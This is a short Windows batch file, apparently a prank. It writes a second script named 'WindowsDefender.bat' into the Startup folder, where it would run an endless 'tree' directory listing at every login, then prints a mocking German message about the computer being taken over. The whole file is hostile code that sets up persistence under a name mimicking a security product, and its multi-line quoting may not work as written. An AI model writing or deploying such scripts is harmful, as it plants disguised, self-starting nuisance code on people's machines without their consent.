@echo off
C:
cd C:\Start Menu\Programs\Startup\
set script="
@echo off^
:a^
tree /F /A^
goto a^
"

:skip
echo %script% > WindowsDefender.bat
echo Computer ge-Schweinekebabt...
pause